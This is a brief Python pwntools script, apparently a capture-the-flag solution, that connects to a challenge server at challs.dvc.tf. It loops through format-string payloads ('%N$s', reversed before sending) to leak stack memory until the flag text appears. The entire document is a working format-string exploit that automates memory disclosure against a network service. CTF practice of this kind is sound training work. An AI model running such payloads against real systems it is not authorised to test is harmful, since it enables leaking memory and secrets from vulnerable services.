from pwn import *

r = remote('challs.dvc.tf', 8888)

def exec_payload(payload):
    print(payload)
    payload = payload[::-1]
    r.sendline(payload)
    r.recvuntil("Result: ")
    r.recvline()
    return r.recvline()

for i in range(1, 400):
    try:
        stack = exec_payload(f'%{i}$s')
        log.info(stack)
        if b'dvCTF' in stack:
            log.info(f'Flag: {stack.decode()}')
            break
    except:
        r = remote('challs.dvc.tf', 8888)
